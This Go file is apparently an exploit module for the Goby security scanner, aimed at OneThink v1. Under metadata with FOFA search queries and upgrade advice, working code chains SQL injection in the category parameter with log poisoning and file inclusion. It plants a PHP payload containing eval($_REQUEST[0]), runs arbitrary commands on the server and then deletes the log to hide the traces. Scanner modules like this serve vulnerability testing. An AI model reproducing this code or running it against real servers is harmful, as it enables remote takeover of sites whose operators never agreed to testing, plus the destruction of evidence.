package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "OneThink category method code execution vulnerabilities",
    "Description": "<p>OneThink is an open source content management framework developed by the ThinkPHP team based on ThinkPHP.</p><p>There is a SQL injection vulnerability in the category parameter of the front-end home/article/index method of the OneThink system v1 version. An attacker can use the vulnerability to jointly query any template, causing the file to be included, and finally obtain server permissions.</p>",
    "Product": "OneThink",
    "Homepage": "http://document.onethink.cn/manual_1_0.html",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "(header=\"ThinkPHP\" && title=\"Onethink\") || body=\"<a href=\\\"http://www.onethink.cn\\\" target=\\\"_blank\\\">OneThink</a>\" || body=\"/css/onethink.css\"",
    "GobyQuery": "(header=\"ThinkPHP\" && title=\"Onethink\") || body=\"<a href=\\\"http://www.onethink.cn\\\" target=\\\"_blank\\\">OneThink</a>\" || body=\"/css/onethink.css\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in the category parameter of the front-end home/article/index method of the OneThink system v1 version. An attacker can use the vulnerability to jointly query any template, causing the file to be included, and finally obtain server permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.qshu1.com/2022/04/11/onethink%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E6%95%B4%E7%90%86/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "echo \"12341234\";",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "0={{{code}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "File Inclusion"
    ],
    "VulType": [
        "SQL Injection",
        "File Inclusion"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "OneThink 内容管理框架 category 方法代码执行漏洞",
            "Product": "OneThink",
            "Description": "<p>OneThink是ThinkPHP团队基于ThinkPHP开发的一个开源的内容管理框架。</p><p>OneThink系统v1版本前台home/article/index方法的category参数存在SQL注入漏洞，攻击者可以通过漏洞联合查询出任意模板，造成文件包含，最终可获取服务器权限。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版本</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>OneThink系统v1版本前台home/article/index方法的category参数存在SQL注入漏洞，攻击者可以通过漏洞联合查询出任意模板，造成文件包含，最终可获取服务器权限。<br></p>",
            "VulType": [
                "SQL注入",
                "文件包含"
            ],
            "Tags": [
                "SQL注入",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "OneThink category method code execution vulnerabilities",
            "Product": "OneThink",
            "Description": "<p>OneThink is an open source content management framework developed by the ThinkPHP team based on ThinkPHP.</p><p>There is a SQL injection vulnerability in the category parameter of the front-end home/article/index method of the OneThink system v1 version. An attacker can use the vulnerability to jointly query any template, causing the file to be included, and finally obtain server permissions.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>There is a SQL injection vulnerability in the category parameter of the front-end home/article/index method of the OneThink system v1 version. An attacker can use the vulnerability to jointly query any template, causing the file to be included, and finally obtain server permissions.<br></p>",
            "VulType": [
                "SQL Injection",
                "File Inclusion"
            ],
            "Tags": [
                "SQL Injection",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10766"
}`


	write_log123455 :=func (u *httpclient.FixUrl,payload string) bool {
		sqliUri := "/index.php?s=Home/Article/index&category[0]=aaa&aab=" + payload
		cfg := httpclient.NewPostRequestConfig(sqliUri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 404{
			return true
		}
		return false
	}


	bin_hex234123 := func(str string) string {
		bName := []byte(str)
		hName := hex.EncodeToString(bName)
		return hName
	}

	include_file123455 := func(u *httpclient.FixUrl, poc string, md5 string, code string, file string) string{
		uri := "/index.php?s=home/Article/index&category[0]=between+0/*&category[1][0]=*/and+0)+and+0)+union+select+"+poc+""
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		if code != "none"{
			cfg.Data = "0=" + code + "unlink(" + file + ");"
		}
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, md5){
			return resp.Utf8Html
		}
		return ""
	}

	get_field_len123455 := func(u *httpclient.FixUrl) int{
		field_len := 0
		for i:=24; i<50;i++{
			uri := fmt.Sprintf("/index.php?s=Home/Article/index&category[0]=between+0/*&category[1][0]=*/and+0)+or+1)+order+by+%d+limit+1--+a",i)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "分类不存在或被禁用"){
				field_len = i - 1
				break
			}
		}
		return field_len
	}

	build_poc123455 := func(length int, hex_str string) string{
		n := length - 3
		poc := ""
		num := ""
		for i:=1; i<=n; i++{
			if i == 10 {
				num = fmt.Sprintf("0x%s,",hex_str)
			}else{
				num = fmt.Sprintf("%d,",i)
			}
			poc += num
		}
		poc = poc + "1,1,1--+a"
		return poc
	}


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			code := "none"
			//unlink删除
			payload := "<?=print_r(md5(1234));unlink(__FILE__);?>"
			day := time.Now().Format("2006_01_02 03:04:05 PM")
			after_day := day[2:10]
			file := fmt.Sprintf("/Runtime/Logs/%s.log", after_day)
			unlink_log := "$_SERVER['DOCUMENT_ROOT'].'" + file + "'"
			field_len := get_field_len123455(u)
			result := write_log123455(u,payload)
			if result{
				log_file := "." + file
				hex_str := bin_hex234123(log_file)
				poc := build_poc123455(field_len,hex_str)
				data := include_file123455(u, poc,"81dc9bdb52d04dc20036dbd8313ed05",code,unlink_log)
				if data != ""{
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			code := ss.Params["code"].(string)
			//unlink删除
			payload := "<?=print_r(md5(123));eval($_REQUEST[0]);print_r(md5(123));unlink(__FILE__);exit;?>"
			day := time.Now().Format("2006_01_02 03:04:05 PM")
			after_day := day[2:10]
			file := fmt.Sprintf("/Runtime/Logs/%s.log", after_day)
			unlink_log := "$_SERVER['DOCUMENT_ROOT'].'" + file + "'"
			field_len := get_field_len123455(expResult.HostInfo)
			result := write_log123455(expResult.HostInfo,payload)
			if result{
				log_file := "." + file
				hex_str := bin_hex234123(log_file)
				poc := build_poc123455(field_len,hex_str)
				data := include_file123455(expResult.HostInfo, poc,"202cb962ac59075b964b07152d234b70",code,unlink_log)
				resultArr := regexp.MustCompile(`202cb962ac59075b964b07152d234b70([\w\W]+)202cb962ac59075b964b07152d234b70`).FindAllStringSubmatch(data, -1)
				if resultArr != nil {
					expResult.Success = true
					expResult.Output = resultArr[len(resultArr)-1][1]
				}
			}
			return expResult
		},
	))
}